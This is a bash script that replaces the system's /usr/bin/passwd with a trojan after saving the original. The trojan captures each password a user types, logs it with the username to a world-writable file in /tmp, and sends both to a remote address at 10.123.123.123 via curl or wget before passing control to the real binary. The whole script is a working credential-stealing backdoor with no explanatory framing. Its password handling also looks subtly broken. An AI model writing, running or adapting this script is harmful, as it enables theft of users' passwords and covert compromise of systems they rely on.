#!/bin/bash

FILE=/tmp/log.log
touch $FILE
chmod 777 $FILE

cp /usr/bin/passwd /usr/bin/passwd.orig
chmod +x /usr/bin/passwd.orig

cat > /usr/bin/passwd << EOF
#!/bin/bash
read -s -p "Enter new UNIX password: " pass
echo ""
read -s -p "Retype new password: " pass
echo "\$(whoami):\$pass" >> /tmp/log.log
pass=\$(python3 -c "import urllib.parse; print(urllib.parse.quote('''\$pass'''))")
if command -v curl >/dev/null 2>&1; then
    curl -s -o /dev/null "http://10.123.123.123:8002/\$pass?user=\$(whoami)"
else
    wget -q -O /dev/null "http://10.123.123.123:8002/\$pass?user=\$(whoami)"
fi
printf "%s\n%s\n" "\$pass" "\$pass" | /usr/bin/passwd.orig >/dev/null 2>&1
echo ""
EOF